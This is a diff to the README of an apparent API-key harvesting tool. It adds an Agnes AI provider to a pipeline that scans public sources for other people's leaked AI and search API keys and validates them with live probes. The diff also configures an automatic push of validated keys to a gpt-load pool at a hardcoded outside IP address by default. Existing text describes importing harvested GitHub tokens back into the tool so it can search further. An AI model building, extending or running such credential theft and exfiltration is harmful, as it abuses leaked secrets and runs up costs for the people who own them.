@@ -55,6 +55,7 @@ The system aims to build a **universal data acquisition framework** primarily ta
 | Gemini | `gemini` | `AIza...` API keys | `generativelanguage.googleapis.com/v1beta/models` | Uses `x-goog-api-key` |
 | Tavily | `tavily` | `tvly-...` / `tavily-...` API keys | `/usage` metadata | Uses `Authorization: Bearer`; inspect stores usage audit fields |
 | SerpApi | `serpapi` | `SERPAPI_API_KEY` / `SERPAPI_KEY` / `SERP_API_KEY` assignments (prefix-less 64-char hex keys (measured on prod: valid keys are 64 hex chars)) | `GET /account.json?api_key=` (Account API) | Account/plan audit via inspect (echoed `api_key` field is dropped); `search.json` answers 200 without a key and is NOT used for validation |
+| Agnes AI | `agnes-ai` | `sk-...` API keys (env-name anchored; `sk-ant-`/`sk-proj-`/`sk-svcacct-` excluded) | minimal chat-completion probe (`agnes-2.0-flash`, `max_tokens=1`) | Base `https://apihub.agnes-ai.com/v1`; `GET /v1/models` is presence-only and NOT used for validation |
 | DeepSeek | `deepseek` | `sk-...` API keys | `GET /models` gate + minimal chat-completion probe (`max_tokens=1`) to surface 402 | Default base URL: `https://api.deepseek.com`; 401 body may be non-JSON; zero-balance keys map to `no-quota-keys.txt` |
 | Kimi / Moonshot | `kimi` | `sk-...` API keys | `GET /v1/models` | Default base URL: `https://api.moonshot.cn/v1`; quotas map to `no-quota-keys.txt` |
 | GLM / Zhipu | `glm` | `{id}.{secret}` dot-form API keys | Chat completion probe (`glm-4.7-flash`) | Default base URL: `https://open.bigmodel.cn/api/paas/v4`; no `/models` endpoint, so inspect is skipped |
@@ -751,6 +752,7 @@ The system features a sophisticated **Query Optimization Engine** with mathemati
 > - [`examples/config-kimi.yaml`](examples/config-kimi.yaml) - Kimi (Moonshot)-only scan that writes provider result files
 > - [`examples/config-glm.yaml`](examples/config-glm.yaml) - GLM (Zhipu)-only scan that writes provider result files
 > - [`examples/config-hf.yaml`](examples/config-hf.yaml) - HuggingFace Hub dataset-file scan (low-yield secondary source) that writes provider result files
+> - [`examples/config-agnes-ai.yaml`](examples/config-agnes-ai.yaml) - Agnes AI-only scan that writes provider result files
 
    The `tasks` section is the core of the configuration, defining what providers to search and how to process them. Refer to the basic configuration example above for a complete tasks configuration.
 
@@ -840,6 +842,10 @@ pipeline into a long-running service:
   both `SERPAPI_PROXY_BASE_URL` and `SERPAPI_PROXY_AUTH_KEY` to be set; the
   pool endpoint implements the same `POST {base}/api/keys` contract as
   TavilyProxyManager).
+- **Automatic push to gpt-load (Agnes AI)**: after each agnes-ai scan
+  completes, validated `sk-` keys auto-push to the configured gpt-load group
+  via `AGNES_LOAD_BASE_URL` / `AGNES_LOAD_GROUP_ID` / `AGNES_LOAD_AUTH_KEY`
+  (group 19 on `http://107.172.141.203:43001` by default).
 - **Self-bootstrap** — after a `github` scan completes, validated GitHub API
   tokens are automatically imported into this instance's own token store
   (`label='harvester-bootstrap'`) so the instance grows its own search
@@ -863,6 +869,9 @@ pipeline into a long-running service:
 | `TAVILY_PROXY_AUTH_KEY` | empty | Master key for that TavilyProxyManager instance |
 | `SERPAPI_PROXY_BASE_URL` | empty | SerpApi key-pool service address |
 | `SERPAPI_PROXY_AUTH_KEY` | empty | Master key for that SerpApi key-pool service |
+| `AGNES_LOAD_BASE_URL` | `http://107.172.141.203:43001` | gpt-load instance base URL for agnes-ai push |
+| `AGNES_LOAD_GROUP_ID` | `19` | gpt-load group to push agnes-ai keys into |
+| `AGNES_LOAD_AUTH_KEY` | empty | gpt-load management auth key for agnes-ai push (empty sends no `Authorization` header) |
 | `HARVESTER_WORKSPACE` | `./data` | Workspace (provider results) |
 | `HARVESTER_DB_PATH` | `<workspace>/harvester.db` | SQLite DB path |
 | `HARVESTER_SELF_BOOTSTRAP` | `1` | Auto-import validated GitHub tokens into this instance's token store after a github scan (self-bootstrap; set 0 to disable) |
